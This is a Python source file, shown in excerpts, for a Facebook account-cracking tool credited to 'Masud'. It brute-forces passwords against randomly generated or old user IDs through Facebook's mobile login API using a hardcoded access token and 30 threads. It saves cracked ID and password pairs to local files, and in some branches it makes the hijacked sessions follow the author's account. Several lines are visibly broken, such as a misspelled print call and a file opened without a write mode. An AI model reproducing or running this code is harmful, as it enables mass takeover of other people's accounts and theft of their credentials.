...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[Masud] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m[Masud-CP] {idf} * {pw}')
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Masud-CP.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [Successful-Masud] {idf} * {pw}')
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [Successful-Masud] {idf} * {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Successful-Masud.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
\033[1;97m
 ...
 ___      ___       __        ________  ____  ____  ________   
|"  \    /"  |     /""\      /"       )("  _||_ " ||"      "\  
 \   \  //   |    /    \    (:   \___/ |   (  ) : |(.  ___  :) 
 /\\  \/.    |   /' /\  \    \___  \   (:  |  | . )|: \   ) || 
|: \.        |  //  __'  \    __/  \\   \\ \__/ // (| (___\ || 
|.  \    /:  | /   /  \\  \  /" \   :)  /\\ __ //\ |:       :) 
|___|\__/|___|(___/    \___)(_______/  (__________)(________/  
...
.............. Masud .............
\033[1;92m══════════════════════════════════════════════════
\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   : Masud
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : Masud Chowdhury 
\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : Masud2544
\33[1;32m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 4.0.1
\033[1;92m══════════════════════════════════════════════════
\33[1;41m\33[1;37m▓░▒░▒▓░▒░▒▓░▒▓░▒▓█[ ✔︎ Masud FREE TOOLS ✔︎ ]█▓▒░▓░▒░▒▓░▒▓░▒▓\33[0m
\033[1;92m══════════════════════════════════════════════════"""
class Main:
	def __init__(self):
		self.id = []
		...
		print("")
		print("\33[1;37m")
		print("\033[1;37mNote : \33[1;41m\33[1;37mApprovel Follow My Id\33[0m")
		print("══════════════════════════════════════════════════")
		print("══════════════════════════════════════════════════")
		print("\033[1;32m  |1| \33[1;37m FOLLOW MY FACEBOOK ACCOUNT ")
		print("\033[1;32m  |2| \33[1;37m 𝗖𝗹𝗼𝘀𝗲 ")
		print("══════════════════════════════════════════════════")
		...
		if Baloch in ["", " "]:
			...
			print("══════════════════════════════════════════════════")
			time.sleep(3.0)
			print("\033[1;32m     You Not Follow The Facebook Account again Follow Please")
			print("══════════════════════════════════════════════════")
			input("\n\033[1;37m ACCOUNT NAME :  \033[1;37m")
			time.sleep(3.1)
			print("══════════════════════════════════════════════════")
			print("\033[1;32m THANKS FOR Follow MY ACCOUNT ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print(" ══════════════════════════════════════════════════")
		print("\033[1;37m")
		print(" \033[1;37m[1]\033[1;37m CRACK FILE")
		print(" \033[1;37m[2] CRACK PUBLICK ID")
		print(" \33[1;37m[3  PAK ID CLONING")
		print(" \033[1;37m[4] 2004 TO 2010[OPEN]")
		print(" \33[1;37m[5] 2011 TO 2021 ")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				os.system("clear")
				print(logo)
				print("     \033[0;97m   FREE MODE ACTIVATE")
				print("\n\033[0;97m [+] BRUTE HAS BEEN START")
				print(" \033[0;97m[+] Note: CP AC OPEN 50℅ JUST NOW")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			"\r [+]%s> /[Masud]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Successful-Masud]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Successful-Masud.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Masud Ok-Just Now] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Masud Ok-Just Now").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
	...
	def old2(self):
		...
		idx = "10000" 
		os.system('clear');print(logo)
		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 1,00,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Masud Ok-Just Now Login] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Masud Ok-Just Now Login","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Successful-Masud] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
